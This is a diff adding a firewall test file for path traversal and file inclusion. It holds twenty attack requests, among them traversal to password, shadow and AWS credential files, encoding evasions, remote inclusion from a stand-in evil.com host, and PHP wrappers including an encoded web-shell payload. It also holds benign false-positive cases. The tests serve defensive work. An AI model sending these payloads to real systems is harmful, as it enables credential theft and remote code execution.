@@ -1,0 +1,304 @@
+meta:
+  category: "Path Traversal"
+  subcategory: "LFI/RFI"
+  owasp: "A01:2021, WSTG-ATHZ-01"
+  severity: "high"
+
+tests:
+  - id: "traversal-001"
+    title: "Basic path traversal to /etc/passwd"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/../../../etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-002"
+    title: "URL-encoded dot-dot-slash"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-003"
+    title: "Double URL encoding"
+    tags: ["traversal", "lfi", "evasion", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/%252e%252e%252f%252e%252e%252fetc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-004"
+    title: "Windows-style backslash traversal"
+    tags: ["traversal", "lfi", "windows", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/..\\..\\..\\windows\\system32\\config\\sam"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-005"
+    title: "Null byte injection"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/../../../etc/passwd%00.jpg"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-006"
+    title: "Traversal via query parameter"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/download"
+      query_string: "file=../../../etc/shadow"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-007"
+    title: "Traversal to /proc/self/environ"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/download"
+      query_string: "file=../../../proc/self/environ"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-008"
+    title: "Remote file inclusion via URL"
+    tags: ["traversal", "rfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/include"
+      query_string: "page=http://evil.com/shell.php"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-009"
+    title: "Remote file inclusion via PHP wrapper"
+    tags: ["traversal", "rfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/include"
+      query_string: "page=php://filter/convert.base64-encode/resource=config.php"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-010"
+    title: "Data URI inclusion"
+    tags: ["traversal", "rfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/include"
+      query_string: "page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-011"
+    title: "UTF-8 encoded traversal"
+    tags: ["traversal", "lfi", "evasion", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/..%c0%af..%c0%af..%c0%afetc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-012"
+    title: "Overlong UTF-8 encoding"
+    tags: ["traversal", "lfi", "evasion", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/%c0%2e%c0%2e%c0%2fetc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-013"
+    title: "Traversal with double slashes"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/....//....//....//etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-014"
+    title: "Traversal to /etc/hosts"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/download"
+      query_string: "file=../../../../etc/hosts"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-015"
+    title: "Traversal in POST body"
+    tags: ["traversal", "lfi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/read"
+      headers:
+        Content-Type: "application/json"
+      body: '{"path":"../../../etc/passwd"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-016"
+    title: "Windows UNC path"
+    tags: ["traversal", "lfi", "windows", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/download"
+      query_string: "file=\\\\evil.com\\share\\payload"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-017"
+    title: "PHP expect wrapper"
+    tags: ["traversal", "rfi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/include"
+      query_string: "page=expect://id"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-018"
+    title: "Traversal via dot-dot-semicolon (Tomcat)"
+    tags: ["traversal", "lfi", "evasion", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/..;/..;/..;/etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-019"
+    title: "Traversal with encoded backslash"
+    tags: ["traversal", "lfi", "evasion", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/files/..%5c..%5c..%5cetc%5cpasswd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "traversal-020"
+    title: "Traversal to AWS credentials"
+    tags: ["traversal", "lfi", "cloud", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/download"
+      query_string: "file=../../.aws/credentials"
+    expected:
+      status: 403
+      action: "block"
+
+  # --- False positives ---
+
+  - id: "traversal-fp-001"
+    title: "False positive - normal file path"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/files/documents/report.pdf"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "traversal-fp-002"
+    title: "False positive - relative path in API"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/v2/users/123/settings"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "traversal-fp-003"
+    title: "False positive - URL with dots in filename"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/download"
+      query_string: "file=report.2024.Q1.pdf"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "traversal-fp-004"
+    title: "False positive - ellipsis in text"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=Loading..."
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "traversal-fp-005"
+    title: "False positive - semantic version"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/packages/express/versions/4.18.2"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "traversal-fp-006"
+    title: "False positive - IP address in parameter"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/lookup"
+      query_string: "ip=192.168.1.1"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "traversal-fp-007"
+    title: "False positive - date format with slashes"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/events"
+      query_string: "date=2024/01/15"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "traversal-fp-008"
+    title: "False positive - file extension"
+    tags: ["traversal", "false-positive"]
+    request:
+      method: "GET"
+      path: "/static/styles/main.css"
+    expected:
+      status: 200
+      action: "allow"
